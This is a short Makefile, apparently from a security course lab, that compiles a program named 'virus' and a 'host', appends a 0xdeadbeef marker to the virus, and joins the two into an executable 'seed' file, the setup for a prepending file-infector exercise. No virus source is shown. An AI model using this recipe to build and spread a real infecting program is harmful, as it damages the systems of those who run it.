CC	= c++
FLAGS 	= 
CFLAGS	= -O2

OBJ_FILE =

all: ${OBJ_FILE} virus host seed

virus: virus.o
	${CC} ${FLAGS} ${CFLAGS} -w -o virus virus.o

host: host.o
	${CC} ${FLAGS} -w -o host host.o

virus.o: virus.cpp
	${CC} ${FLAGS} ${CFLAGS} -w -c virus.cpp

host.o: host.cpp
	${CC} ${FLAGS} -w -c host.cpp

seed:
	printf '\xde\xad\xbe\xef' >> virus
	cat virus host > seed
	chmod u+x seed

clean:
	rm -f virus virus.o host host.o seed
